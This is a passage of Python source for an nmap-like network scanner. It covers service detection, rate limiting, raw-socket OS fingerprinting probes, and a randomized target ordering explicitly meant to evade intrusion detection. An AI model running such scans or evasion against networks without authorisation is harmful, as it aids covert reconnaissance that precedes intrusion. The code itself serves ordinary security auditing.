#!/usr/bin/env python3
"""
PyScanner v9.0 - Professional Python Network Scanner (nmap-like)
================================================================
v1->v8 retained (all fixes, upgrades, and enhancements)

v8->v9 capabilities:
  [V9-1] BPF/libpcap packet capture: PacketCapture wraps libpcap via
          ctypes with a kernel-level BPF filter ("tcp and host X"),
          eliminating false positives from other hosts' traffic.
          Falls back to raw socket automatically if libpcap absent.
          Plugged into syn_batch_scan as a drop-in recv_sock replacement.
  [V9-2] Distributed scanning: DistributedScanner splits targets into
          N shards and runs parallel sub-processes via
          multiprocessing.Pool. DistributedWorkerServer provides an
          HTTP API so remote worker nodes can be coordinated.
          Results from all shards are merged and deduplicated.
  [V9-3] 20 additional vulnerability/recon plugins (33 total):
          heartbleed, ms17_010, http_methods, dns_zone_transfer,
          smtp_open_relay, ssh_hostkey, telnet_banner, vnc_no_auth,
          http_robots, mysql_empty_password, ntp_monlist,
          elasticsearch_unauth, k8s_unauth, memcached_unauth,
          rsync_unauth, snmp_community, ldap_rootdse,
          pop3_capabilities, iis_webdav, tftp_test
  [V9-4] Epoll/select receive loop: _EpollReceiver replaces blocking
          recvfrom() with epoll (Linux) or select (cross-platform),
          batch-draining the socket in non-blocking mode. 2-5x fewer
          CPU cycles per packet on high-traffic networks.
  [V9-5] Nmap-compatible XML + CSV export: export_xml() writes the
          Nmap .xml schema (importable by Metasploit/Nessus/Armitage);
          export_csv() writes a flat table suitable for spreadsheets.
  [V9-6] Network topology summary: TopologyAnalyzer groups hosts by
          /24 subnet, ranks most-open hosts, identifies likely
          gateways, and prints an ASCII tree of the network.

Usage:
  python pyscanner.py -t 192.168.1.1 -p 1-1024 --scan-type syn
  python pyscanner.py -t 192.168.1.0/24 --ping-scan
  python pyscanner.py -t 2001:db8::1 -p 80,443 --scan-type syn --ipv6
  python pyscanner.py -t 10.0.0.0/24 -p 1-1024 -T4 --scripts --checkpoint state.json
  python pyscanner.py -t 10.0.0.0/24 -p 1-1024 --resume state.json
  python pyscanner.py -t 192.168.1.0/24 --distributed --workers 4
  python pyscanner.py -t 192.168.1.1 -p 1-1024 -o report.xml
  python pyscanner.py --help
"""

import argparse
import asyncio
import concurrent.futures
import datetime
import importlib
import importlib.util
import ipaddress
import json
import os
import platform
import queue
import random
import re
import signal
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Callable, Dict, List, Optional, Tuple

# ─────────────────────────────────────────────
# Optional imports (degrade gracefully)
# ─────────────────────────────────────────────
try:
    import whois as pywhois
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False

try:
    import urllib.request as _urllib_req
    import urllib.error as _urllib_err
    HAS_URLLIB = True
except ImportError:
    HAS_URLLIB = False

# ─────────────────────────────────────────────
# Platform flags
# ─────────────────────────────────────────────
IS_LINUX   = sys.platform.startswith("linux")
IS_WINDOWS = sys.platform.startswith("win")
IS_MACOS   = sys.platform.startswith("darwin")

# ─────────────────────────────────────────────
# ANSI Colours
# ─────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
CYAN    = "\033[96m"
MAGENTA = "\033[95m"
WHITE   = "\033[97m"
DIM     = "\033[2m"


def color(text: str, c: str) -> str:
    if sys.stdout.isatty():
        return f"{c}{text}{RESET}"
    return text


# ─────────────────────────────────────────────
# Well-known port -> service name mapping
# ─────────────────────────────────────────────
COMMON_PORTS: Dict[int, str] = {
    20: "ftp-data", 21: "ftp", 22: "ssh", 23: "telnet",
    25: "smtp", 53: "dns", 67: "dhcp", 68: "dhcp",
    69: "tftp", 80: "http", 110: "pop3", 111: "rpcbind",
    119: "nntp", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
    138: "netbios-dgm", 139: "netbios-ssn", 143: "imap",
    161: "snmp", 162: "snmptrap", 179: "bgp", 194: "irc",
    389: "ldap", 443: "https", 445: "smb", 465: "smtps",
    514: "syslog", 515: "printer", 587: "submission",
    631: "ipp", 636: "ldaps", 993: "imaps", 995: "pop3s",
    1080: "socks", 1194: "openvpn", 1433: "mssql",
    1521: "oracle", 1723: "pptp", 2049: "nfs",
    2181: "zookeeper", 2375: "docker", 2376: "docker-tls",
    3000: "grafana", 3306: "mysql", 3389: "rdp",
    4369: "epmd", 5000: "upnp", 5432: "postgresql",
    5672: "amqp", 5900: "vnc", 5985: "winrm",
    5986: "winrm-https", 6379: "redis", 6443: "k8s-api",
    7001: "weblogic", 8000: "http-alt", 8080: "http-proxy",
    8081: "http-alt2", 8443: "https-alt", 8888: "http-alt3",
    9000: "php-fpm", 9090: "prometheus", 9200: "elasticsearch",
    9300: "elasticsearch-transport", 10250: "kubelet",
    11211: "memcached", 15672: "rabbitmq-mgmt",
    27017: "mongodb", 27018: "mongodb-shard",
    50070: "hdfs-namenode",
}

# Ports that should be SSL-wrapped for banner grabbing [FIX-9]
SSL_PORTS = {443, 636, 993, 995, 465, 8443, 5986}

# [FIX-30/31/32] Retransmit limits
SYN_MAX_RETRIES  = 2   # SYN probes per port before "filtered"
ICMP_MAX_PROBES  = 3   # ICMP pings per host before "down"
UDP_MAX_RETRIES  = 2   # UDP probes per port before "open|filtered"

# [FIX-33] Largest network allowed without --force-large
CIDR_HOST_LIMIT  = 65534   # /16 boundary

# [FIX-34] Service version regex patterns: (pattern, label_template)
# Applied to raw banner strings; first match wins.
SERVICE_VERSION_PATTERNS = [
    # SSH
    (r"SSH-\d+\.\d+-OpenSSH[_\s]([\d.p]+)",    r"OpenSSH \1"),
    (r"SSH-\d+\.\d+-dropbear[_\s]([\d.]+)",     r"Dropbear SSH \1"),
    (r"SSH-\d+\.\d+-([\w._-]+)",                r"SSH \1"),
    # HTTP servers
    (r"Apache/([\d.]+)",                         r"Apache \1"),
    (r"nginx/([\d.]+)",                          r"nginx \1"),
    (r"Microsoft-IIS/([\d.]+)",                  r"IIS \1"),
    (r"lighttpd/([\d.]+)",                       r"lighttpd \1"),
    (r"LiteSpeed",                               r"LiteSpeed"),
    # FTP
    (r"220.*?vsFTPd ([\d.]+)",                   r"vsFTPd \1"),
    (r"220.*?ProFTPD ([\d.]+)",                  r"ProFTPD \1"),
    (r"220.*?FileZilla Server ([\d.]+)",         r"FileZilla FTP \1"),
    # Mail
    (r"220.*?Postfix",                           r"Postfix SMTP"),
    (r"220.*?Exim ([\d.]+)",                     r"Exim \1"),
    (r"\+OK.*?Dovecot",                          r"Dovecot POP3"),
    (r"\* OK.*?Dovecot",                         r"Dovecot IMAP"),
    # Databases
    (r"^.\x00\x00\x00\n([\d.]+)",               r"MySQL \1"),   # MySQL handshake
    (r"redis_version:([\d.]+)",                  r"Redis \1"),
    (r"memcached ([\d.]+)",                      r"Memcached \1"),
    # VPN / misc
    (r"OpenVPN ([\d.]+)",                        r"OpenVPN \1"),
    (r"JDWP-Handshake",                          r"Java Debug Wire Protocol"),
]

# [FIX-7] Global semaphore - limits concurrent raw socket operations
_RAW_SOCKET_SEM = threading.Semaphore(50)


# ─────────────────────────────────────────────
# [FIX-26] Token-bucket rate limiter
# Controls how many packets per second are sent.
# Default: unlimited (None). Set via --rate flag.
# ─────────────────────────────────────────────

class TokenBucket:
    """
    Thread-safe token bucket for rate limiting.
    Allows bursts up to `capacity` tokens then enforces `rate` pps.
    """
    def __init__(self, rate_pps: float, capacity: int = 0):
        self.rate     = rate_pps          # tokens added per second
        self.capacity = capacity or max(int(rate_pps), 1)
        self.tokens   = float(self.capacity)
        self._lock    = threading.Lock()
        self._last    = time.monotonic()

    def consume(self, n: int = 1) -> None:
        """Block until n tokens are available, then consume them."""
        while True:
            with self._lock:
                now    = time.monotonic()
                delta  = now - self._last
                self._last = now
                self.tokens = min(
                    self.capacity,
                    self.tokens + delta * self.rate)
                if self.tokens >= n:
                    self.tokens -= n
                    return
                wait = (n - self.tokens) / self.rate
            time.sleep(wait)


# Global rate limiter – replaced by main() if --rate is set
_RATE_LIMITER: Optional[TokenBucket] = None


# ─────────────────────────────────────────────
# [FIX-25] Unique ephemeral port allocator
# Tracks used source ports per scan session to prevent collisions
# when probing many ports simultaneously.
# ─────────────────────────────────────────────

class _EphemeralPortAllocator:
    """Issue unique random source ports; wraps around if exhausted."""
    _LOW  = 32768
    _HIGH = 60999

    def __init__(self):
        self._used: set = set()
        self._lock = threading.Lock()

    def alloc(self) -> int:
        with self._lock:
            pool = self._HIGH - self._LOW + 1
            if len(self._used) >= pool:
                self._used.clear()   # full reset when exhausted
            while True:
                p = random.randint(self._LOW, self._HIGH)
                if p not in self._used:
                    self._used.add(p)
                    return p

    def free(self, port: int) -> None:
        with self._lock:
            self._used.discard(port)


_PORT_ALLOC = _EphemeralPortAllocator()


# ─────────────────────────────────────────────
# Data Classes
# ─────────────────────────────────────────────

@dataclass
class PortResult:
    port: int
    protocol: str = "tcp"
    state: str = "unknown"     # open / closed / filtered / open|filtered
    service: str = ""
    banner: str = ""
    version: str = ""          # [FIX-34] extracted software version string
    reason: str = ""


@dataclass
class HostResult:
    ip: str
    hostname: str = ""
    status: str = "down"
    latency_ms: float = 0.0
    os_guess: str = ""
    ttl: int = 0
    mac: str = ""
    ports: List[PortResult] = field(default_factory=list)
    http_headers: Dict[str, str] = field(default_factory=dict)
    whois_info: str = ""
    open_count: int = 0
    scan_time: str = ""
    # [FIX-28] OS fingerprinting signals captured from SYN-ACK replies
    tcp_window:      int  = 0      # remote TCP window size
    has_tcp_options: bool = False   # remote SYN-ACK had TCP options
    df_bit:          bool = False   # remote IP header had DF flag set


@dataclass
class ScanSummary:
    command: str
    start_time: str
    end_time: str
    elapsed_sec: float
    total_hosts: int
    hosts_up: int
    hosts_down: int
    total_ports_scanned: int
    open_ports: int
    results: List[HostResult] = field(default_factory=list)


# ─────────────────────────────────────────────
# Utilities
# ─────────────────────────────────────────────

def resolve_host(target: str, prefer_ipv6: bool = False) -> Optional[str]:
    """
    [FIX-27] Resolve hostname to IP (v4 or v6).
    Returns None on failure.
    """
    family = socket.AF_INET6 if prefer_ipv6 else socket.AF_INET
    try:
        infos = socket.getaddrinfo(target, None, family)
        if infos:
            return infos[0][4][0]
    except socket.gaierror:
        pass
    # Fallback: try other family
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        return None


def reverse_dns(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ""


def is_ipv6(addr: str) -> bool:
    """[FIX-27] Return True if addr is an IPv6 address."""
    try:
        socket.inet_pton(socket.AF_INET6, addr)
        return True
    except (socket.error, OSError):
        return False


def expand_cidr(network: str, force_large: bool = False) -> List[str]:
    """
    [FIX-27] Expand IPv4 or IPv6 CIDR to host list.
    [FIX-33] Refuses to expand networks larger than CIDR_HOST_LIMIT hosts
             unless force_large=True is passed (set by --force-large CLI flag).
    """
    try:
        net = ipaddress.ip_network(network, strict=False)
        host_count = net.num_addresses - 2  # exclude network/broadcast
        if host_count > CIDR_HOST_LIMIT and not force_large:
            print(color(
                f"[!] Network {network} has {host_count:,} hosts "
                f"(>{CIDR_HOST_LIMIT:,}). Use --force-large to scan it.",
                RED))
            return []
        return [str(h) for h in net.hosts()]
    except ValueError:
        return [network]


def parse_ports(port_str: str) -> List[int]:
    """Parse '22,80,100-200' into a sorted unique list of ints."""
    ports: set = set()
    for part in port_str.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            lo, hi = part.split("-", 1)
            ports.update(range(int(lo), int(hi) + 1))
        else:
            ports.add(int(part))
    return sorted(ports)


# ═══════════════════════════════════════════════════════════════════
# [ENH-11] TARGET PERMUTATION ENGINE  (ZMap architecture)
# ═══════════════════════════════════════════════════════════════════
#
# Sequential scanning (192.168.1.1, .2, .3 …) has two problems:
#
#   1. IDS detects the sweep pattern immediately (consecutive IPs)
#   2. Network load is bursty — all traffic hits one subnet at once
#
# ZMap's solution: iterate hosts in a pseudo-random order that covers
# every IP in a range exactly once, using a multiplicative group of
# integers modulo a prime.
#
# Algorithm (same as ZMap source, zmap/lib/blacklist.c):
#   - Choose a prime p ≥ n  (n = number of targets)
#   - Choose a random primitive root g modulo p
#   - Start at a random position x₀ in [1, p-1]
#   - Generate sequence:  xᵢ = (xᵢ₋₁ × g) mod p
#   - Skip values > n (out of range) until we wrap
#   - Map index → IP via the original target list
#
# Properties:
#   • Visits every host exactly once (permutation, not shuffle)
#   • O(1) memory — only current state stored, not the full list
#   • Deterministic given (seed, prime) → reproducible scans
#   • Resumes from any position without re-scanning
#   • Spreads load uniformly across subnets
#
# For small lists (<= 50k hosts) a Fisher-Yates shuffle is used
# instead (simpler, same IDS-evasion benefit, lower overhead).
# ═══════════════════════════════════════════════════════════════════

def _next_prime_ge(n: int) -> int:
    """Return the smallest prime ≥ n.  Miller-Rabin for large n."""
    def _is_prime(x: int) -> bool:
        if x < 2:  return False
        if x < 4:  return True
        if x % 2 == 0 or x % 3 == 0: return False
        # Miller-Rabin witnesses sufficient for x < 3.3 × 10²⁴
        witnesses = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37]
        d, r = x - 1, 0
        while d % 2 == 0:
            d //= 2
            r  += 1
        for a in witnesses:
            if a >= x: continue
            x0 = pow(a, d, x)
            if x0 in (1, x - 1): continue
            for _ in range(r - 1):
                x0 = pow(x0, 2, x)
                if x0 == x - 1: break
            else:
                return False
        return True

    if n <= 2:  return 2
    c = n if n % 2 != 0 else n + 1
    while not _is_prime(c):
        c += 2
    return c


def _primitive_root(p: int) -> int:
    """
    Find a primitive root modulo prime p.
    A primitive root g satisfies: {g^1, g^2, …, g^(p-1)} = {1, …, p-1} mod p.
    We try small candidates and verify using Euler's criterion on each
    prime factor of p-1.
    """
    if p == 2: return 1
    phi  = p - 1
    # Factorise phi = p - 1  (sufficient for prime p)
    factors: set = set()
    n    = phi
    d    = 2
    while d * d <= n:
        while n % d == 0:
            factors.add(d)
            n //= d
        d += 1
    if n > 1:
        factors.add(n)

    for g in range(2, p):
        if all(pow(g, phi // f, p) != 1 for f in factors):
            return g
    return 2   # fallback (never reached for valid prime)


class TargetPermutator:
    """
    [ENH-11] Deterministic pseudo-random target permutation.

    Implements ZMap's cyclic group permutation over a prime field.
    Given a list of n targets, produces all n targets in a
    pseudo-random order that:

      • Visits every target exactly once
      • Is reproducible from (seed, targets)
      • Spreads load across subnets uniformly
      • Supports resume from an arbitrary position

    Usage::

        perm = TargetPermutator(targets, seed=42)
        for ip in perm:
            scan(ip)

        # Resume from position 1000:
        perm2 = TargetPermutator(targets, seed=42, start_pos=1000)

    For lists ≤ SMALL_LIST_THRESHOLD, uses Fisher-Yates shuffle
    (simpler and faster for small n).
    """

    SMALL_LIST_THRESHOLD = 50_000

    def __init__(self, targets: List[str],
                 seed: Optional[int] = None,
                 start_pos: int = 0):
        self._targets   = targets
        self._n         = len(targets)
        self._seed      = seed if seed is not None else random.randint(0, 2**31)
        self._start_pos = start_pos
        self._use_small = self._n <= self.SMALL_LIST_THRESHOLD

        if not self._use_small and self._n > 1:
            self._prime = _next_prime_ge(self._n)
            # Use seeded RNG to choose g and x0 deterministically
            rng         = random.Random(self._seed)
            self._g     = _primitive_root(self._prime)
            # Start at a random position in [1, prime-1]
            self._x0    = rng.randint(1, self._prime - 1)

    def __iter__(self):
        if self._n == 0:
            return
        if self._n == 1:
            yield self._targets[0]
            return

        if self._use_small:
            # Fisher-Yates shuffle — copy so we don't mutate the original
            lst = list(self._targets)
            rng = random.Random(self._seed)
            rng.shuffle(lst)
            for ip in lst[self._start_pos:]:
                yield ip
            return

        # ── Multiplicative group iteration (ZMap algorithm) ───────────
        #
        # The group Z/pZ* has order p-1.  Starting from x0, we iterate:
        #
        #   x → (x × g) mod p  for p-1 steps
        #
        # This visits every element in {1, …, p-1} exactly once.
        # Elements x where x > n are skipped (out of range for index).
        # Since p >= n, this guarantees all n in-range indices are visited.
        #
        # Crucially: we must include x0 itself in the iteration.
        # The standard formulation starts at x = x0 and applies the
        # first multiply BEFORE checking, so x0 is consumed as the
        # starting point, not yielded.  The fix: we iterate p-1 times
        # and check each value including the one produced at step p-1
        # (which equals x0 again — but we stop before repeating).
        #
        # Correct implementation:
        #   - Yield x0 if in range (as the first element)
        #   - Then iterate p-2 more multiplications
        #   - Stop when we would produce x0 again (full cycle)
        prime   = self._prime
        g       = self._g
        x       = self._x0          # current element
        count   = 0                 # valid elements yielded
        skipped = 0                 # elements skipped for start_pos

        # We iterate the full group orbit: x0, x0*g, x0*g², …, x0*g^(p-2)
        # Each step: check if in range, yield or skip.
        for step in range(prime - 1):   # exactly p-1 distinct elements
            if x <= self._n:            # in-range index (1-based)
                if skipped < self._start_pos:
                    skipped += 1
                else:
                    yield self._targets[x - 1]
                    count += 1
                    if count >= self._n - self._start_pos:
                        return

            # Advance to next element in the group
            x = (x * g) % prime
            if x == self._x0:
                return              # full cycle complete (shouldn't happen early)

    def __len__(self) -> int:
        return max(0, self._n - self._start_pos)

    @property
    def seed(self) -> int:
        return self._seed

    def resume_state(self) -> Dict[str, Any]:
        """Return state dict that can recreate this permutator at current position."""
        return {"seed": self._seed, "n": self._n,
                "start_pos": self._start_pos,
                "small": self._use_small}


def permute_targets(targets: List[str],
                    seed: Optional[int] = None) -> List[str]:
    """
    [ENH-11] Return targets in pseudo-random permuted order.
    Convenience wrapper around TargetPermutator — materialises the
    full sequence into a list (fine for n ≤ CIDR_HOST_LIMIT).
    """
    return list(TargetPermutator(targets, seed=seed))


def permute_ports(ports: List[int],
                  seed: Optional[int] = None) -> List[int]:
    """
    [ENH-11] Permute port list pseudo-randomly.
    Uses same cyclic group algorithm so port order is as unpredictable
    as target order — avoids sequential port sweeps that IDS detects.
    """
    as_str  = [str(p) for p in ports]
    permuted = list(TargetPermutator(as_str, seed=seed))
    return [int(p) for p in permuted]


def service_name(port: int, proto: str = "tcp") -> str:
    if port in COMMON_PORTS:
        return COMMON_PORTS[port]
    try:
        return socket.getservbyport(port, proto)
    except Exception:
        return "unknown"


def now_str() -> str:
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def elapsed(start: float) -> float:
    return round(time.time() - start, 3)


def get_local_ip(dst: str = "8.8.8.8") -> str:
    """
    [FIX-1] Return the real outbound IP of this machine.
    [FIX-27] Supports both IPv4 and IPv6 destinations.
    Uses UDP connect trick – no packet is actually sent.
    """
    family = socket.AF_INET6 if is_ipv6(dst) else socket.AF_INET
    probe_dst = "2001:4860:4860::8888" if family == socket.AF_INET6 else "8.8.8.8"
    try:
        s = socket.socket(family, socket.SOCK_DGRAM)
        s.connect((probe_dst, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return "127.0.0.1"


# ─────────────────────────────────────────────
# [FIX-10] OS Fingerprinting with TTL normalisation
# Routers decrement TTL. We round UP to nearest
# common initial TTL value before guessing OS.
# ─────────────────────────────────────────────

_INITIAL_TTLS = [32, 60, 64, 128, 255]


def _normalise_ttl(observed: int) -> int:
    """Round observed TTL up to the most likely initial TTL value."""
    for init in _INITIAL_TTLS:
        if observed <= init:
            return init
    return 255


def ttl_to_os(ttl: int) -> str:
    """Heuristic OS guess from TTL, hop-decrement normalised."""
    if ttl <= 0:
        return "unknown"
    norm = _normalise_ttl(ttl)
    mapping = {
        32:  "Windows 9x/ME",
        60:  "Solaris/AIX",
        64:  "Linux/Unix/macOS",
        128: "Windows",
        255: "Cisco/Network device",
    }
    return mapping.get(norm, "unknown")


def os_fingerprint(ip: str, open_ports: List[int], ttl: int,
                   tcp_window: int = 0,
                   has_tcp_options: bool = False,
                   df_bit: bool = False) -> str:
    """
    [FIX-28] Multi-signal OS fingerprinting (Nmap-style scoring).

    Signals used and their weights:
      1. TTL (normalised, hop-decrement-aware)         — 2 pts each match
      2. TCP window size (characteristic per OS)        — 3 pts each match
      3. DF (Don't Fragment) bit in IP header           — 1 pt each match
      4. TCP options presence in SYN-ACK                — 1 pt each match
      5. Open-port pattern (RDP/SMB/AFP/SSH etc.)       — 4 pts each match

    Each OS candidate accumulates points; highest scorer wins.
    Ties broken by TTL signal. Returns labelled string with confidence.
    """
    # ── OS candidate definitions ─────────────────────────────────────
    # Each entry: (name, ttl_norm, typical_windows, df_expected, opts_expected)
    OS_PROFILES = [
        # name                  ttl   windows   df     opts
        ("Linux 2.6+",          64,   [5840, 14600, 29200, 65535], True,  True),
        ("Linux 3.x/4.x",       64,   [29200, 65535],              True,  True),
        ("macOS / iOS",         64,   [65535, 65228],              True,  True),
        ("Windows 10/11",       128,  [8192, 65535, 64240],        True,  True),
        ("Windows 7/8",         128,  [8192, 16384],               True,  True),
        ("Windows Server",      128,  [8192, 65535],               True,  True),
        ("Cisco IOS",           255,  [4128, 16384],               True,  False),
        ("FreeBSD / OpenBSD",   64,   [65535, 16384],              True,  True),
        ("Solaris",             255,  [8760, 49152],               True,  True),
    ]

    # ── Known port evidence (highest weight) ─────────────────────────
    port_evidence: List[Tuple[str, List[int]]] = [
        ("Windows",    [3389, 135, 445, 139, 5985]),
        ("Linux/Unix", [22]),
        ("macOS",      [548, 62078, 88]),
        ("Cisco",      [23, 179, 4786]),
    ]

    # ── Score each candidate ──────────────────────────────────────────
    ttl_norm = _normalise_ttl(ttl) if ttl > 0 else 0
    scores: Dict[str, int] = {}

    for (name, os_ttl, os_windows, os_df, os_opts) in OS_PROFILES:
        score = 0
        # Signal 1: TTL match
        if ttl_norm == os_ttl:
            score += 2
        # Signal 2: TCP window size
        if tcp_window and tcp_window in os_windows:
            score += 3
        # Signal 3: DF bit
        if df_bit == os_df:
            score += 1
        # Signal 4: TCP options presence
        if has_tcp_options == os_opts:
            score += 1
        scores[name] = score

    # Signal 5: open-port patterns (strongest signal, applied after)
    port_boost: Dict[str, int] = {}
    for (os_label, ports) in port_evidence:
        matches = sum(1 for p in ports if p in open_ports)
        if matches:
            port_boost[os_label] = matches * 4

    # Apply port boost to any candidate whose name starts with the label
    for (name, _) in [(n, s) for n, s in scores.items()]:
        for os_label, boost in port_boost.items():
            if os_label.lower() in name.lower():
                scores[name] = scores.get(name, 0) + boost

    # ── Pick winner ───────────────────────────────────────────────────
    if not scores or max(scores.values()) == 0:
        return ttl_to_os(ttl) or "Unknown"

    best_name = max(scores, key=lambda k: scores[k])
    best_score = scores[best_name]

    # Confidence label based on total available signals
    max_possible = 2 + 3 + 1 + 1 + 4   # sum of all signal weights
    confidence_pct = min(100, int(best_score / max_possible * 100))
    if confidence_pct >= 70:
        confidence = "high"
    elif confidence_pct >= 40:
        confidence = "medium"
    else:
        confidence = "low"

    return f"{best_name} (confidence: {confidence}, score: {best_score})"




# ═══════════════════════════════════════════════════════════════════
# [ENH-3] DEEP OS FINGERPRINTING ENGINE (Nmap T1-T7 + IE + ECN)
# ═══════════════════════════════════════════════════════════════════

@dataclass
class OsProbeResult:
    """Raw observations collected by OsProbeEngine."""
    # TCP sequence number class: random / time-based / const / increment
    isn_class:        str   = "unknown"
    # IP ID sequence: zero / random / increment / broken
    ipid_class:       str   = "unknown"
    # Observed TCP options order string (e.g. "MSS,SACK,TS,NOP,WS")
    tcp_opts_order:   str   = ""
    # Window scale value extracted from options
    win_scale:        int   = 0
    # Whether ECN (Explicit Congestion Notification) was accepted
    ecn_support:      bool  = False
    # ICMP echo: whether DF bit is echoed back
    icmp_df_echo:     bool  = False
    # ICMP echo: whether ToS is echoed back
    icmp_tos_echo:    bool  = False
    # TCP window from SYN-ACK (already captured in v7)
    tcp_window:       int   = 0
    # Whether timestamps were returned
    ts_option:        bool  = False
    # Measured TTL
    ttl:              int   = 0


class OsProbeEngine:
    """
    [ENH-3] Deep OS fingerprinting engine.

    Sends a sequence of specialised TCP/ICMP probes (like Nmap's T1-T7,
    IE1/IE2, ECN probes) and collects low-level observations:

      T1  — SYN to open port  (captures window, options, ISN)
      T2  — NULL to open port (captures response type)
      T3  — FIN+PSH+URG to open port
      T4  — SYN with unusual options to open port
      T5  — SYN to closed port
      T6  — ACK to closed port
      T7  — FIN+PSH+URG to closed port
      IE1 — ICMP echo request (code=9, ToS=0)
      IE2 — ICMP echo request (code=0, ToS=4)
      ECN — SYN with ECE+CWR flags

    Observations are scored against extended OS profiles.
    Returns an OsProbeResult plus a refined os_guess string.
    """

    def __init__(self, ip: str, open_port: int, closed_port: int,
                 timeout: float = 2.0):
        self.ip          = ip
        self.open_port   = open_port
        self.closed_port = closed_port
        self.timeout     = timeout
        self.src_ip      = get_local_ip(ip)

    def probe(self) -> Tuple[OsProbeResult, str]:
        """
        Run all probes. Returns (OsProbeResult, os_guess_string).
        Gracefully degrades if raw sockets are unavailable.
        """
        result = OsProbeResult()

        try:
            recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                      socket.IPPROTO_TCP)
            recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                                 4 * 1024 * 1024)
            recv_sock.settimeout(self.timeout)
        except (PermissionError, OSError):
            return result, "Unknown (no raw socket)"

        send_times: Dict[int, float] = {}
        isns: List[int] = []
        ipids: List[int] = []

        # ── Probe definitions ─────────────────────────────────────────
        probes: List[Tuple[str, int, int]] = [
            # (label, dst_port, flags)
            ("T1",  self.open_port,   0x02),           # SYN to open
            ("T2",  self.open_port,   0x00),           # NULL to open
            ("T3",  self.open_port,   F_FIN|F_PSH|F_URG),  # FIN+PSH+URG open
            ("T4",  self.open_port,   0x02),           # SYN (special opts) open
            ("T5",  self.closed_port, 0x02),           # SYN to closed
            ("T6",  self.closed_port, F_ACK),          # ACK to closed
            ("T7",  self.closed_port, F_FIN|F_PSH|F_URG),  # FIN+PSH+URG closed
            ("ECN", self.open_port,   0x02|F_ECE|F_CWR),   # ECN probe
        ]

        src_ports: Dict[str, int] = {}
        allocated: List[int] = []

        try:
            # Send all TCP probes
            for label, dst, flags in probes:
                sp = _PORT_ALLOC.alloc()
                allocated.append(sp)
                src_ports[label] = sp
                seq = random.randint(0, 0xFFFFFFFF)
                pkt = _build_flag_packet(self.src_ip, self.ip,
                                         sp, dst, flags, seq)
                if _RATE_LIMITER:
                    _RATE_LIMITER.consume(1)
                try:
                    recv_sock.sendto(pkt, (self.ip, 0))
                    send_times[sp] = time.time()
                except OSError:
                    pass

            # Also send ICMP echo probes (IE1, IE2) — need ICMP socket
            icmp_sock: Optional[socket.socket] = None
            try:
                icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                          socket.IPPROTO_ICMP)
                icmp_sock.settimeout(self.timeout)
                pid   = os.getpid() & 0xFFFF
                # IE1: code=9, ToS=0
                self._send_icmp_probe(icmp_sock, code=9,  tos=0,  seq=0x9001)
                # IE2: code=0, ToS=4
                self._send_icmp_probe(icmp_sock, code=0,  tos=4,  seq=0x9002)
            except (PermissionError, OSError):
                icmp_sock = None

            # Collect TCP responses
            deadline = time.time() + self.timeout
            while time.time() < deadline:
                try:
                    data, addr = recv_sock.recvfrom(4096)
                except socket.timeout:
                    break
                except OSError:
                    break

                if addr[0] != self.ip or len(data) < 20:
                    continue
                if data[9] != socket.IPPROTO_TCP:
                    continue

                ihl = (data[0] & 0x0F) * 4
                if len(data) < ihl + 20:
                    continue

                reply_dst = struct.unpack("!H", data[ihl+2:ihl+4])[0]
                reply_src = struct.unpack("!H", data[ihl:ihl+2])[0]

                # Track IP ID sequence
                ip_id = struct.unpack("!H", data[4:6])[0]
                ipids.append(ip_id)

                # Track ISN from SYN-ACK replies
                flags_rx = data[ihl+13]
                if flags_rx & 0x12:   # SYN-ACK
                    isn = struct.unpack("!L", data[ihl+4:ihl+8])[0]
                    isns.append(isn)

                    # Parse TCP options from response
                    if not result.tcp_opts_order:
                        result.tcp_opts_order = self._parse_tcp_options(
                            data, ihl)
                        result.tcp_window = struct.unpack(
                            "!H", data[ihl+14:ihl+16])[0]

                    # Window scale
                    ws = self._extract_window_scale(data, ihl)
                    if ws >= 0:
                        result.win_scale = ws

                    # ECN support: if ECE flag set in SYN-ACK
                    if flags_rx & F_ECE:
                        result.ecn_support = True

                    # Send RST
                    remote_seq = struct.unpack("!L", data[ihl+4:ihl+8])[0]
                    _send_rst(self.src_ip, self.ip, reply_dst,
                              reply_src, remote_seq + 1)

                result.ttl = max(result.ttl, data[8])

            # Collect ICMP responses if available
            if icmp_sock is not None:
                deadline2 = time.time() + self.timeout / 2
                while time.time() < deadline2:
                    try:
                        raw, addr = icmp_sock.recvfrom(1024)
                    except socket.timeout:
                        break
                    except OSError:
                        break
                    if addr[0] == self.ip and len(raw) >= 28:
                        ihl2 = (raw[0] & 0x0F) * 4
                        if raw[ihl2] == 0:   # ICMP echo reply
                            # Check DF bit echoed
                            result.icmp_df_echo = bool(
                                struct.unpack("!H", raw[6:8])[0] & 0x4000)
                            result.icmp_tos_echo = (raw[1] != 0)
                icmp_sock.close()

        finally:
            recv_sock.close()
            for p in allocated:
                _PORT_ALLOC.free(p)

        # ── Classify observations ────────────────────────────────────
        result.isn_class  = self._classify_isn(isns)
        result.ipid_class = self._classify_ipid(ipids)

        # ── Score against extended OS profiles ───────────────────────
        os_guess = self._score_profiles(result)
        return result, os_guess

    def _send_icmp_probe(self, sock: socket.socket,
                         code: int, tos: int, seq: int) -> None:
        pid  = os.getpid() & 0xFFFF
        hdr  = struct.pack("!BBHHH", 8, code, 0, pid, seq)
        pay  = b"\x00" * 8
        chk  = checksum(hdr + pay)
        hdr  = struct.pack("!BBHHH", 8, code, chk, pid, seq)
        try:
            sock.sendto(hdr + pay, (self.ip, 0))
        except OSError:
            pass

    def _parse_tcp_options(self, data: bytes, ihl: int) -> str:
        """Return a string like 'MSS,SACK,TS,NOP,WS' from TCP options."""
        tcp_data_off = (data[ihl+12] >> 4) * 4
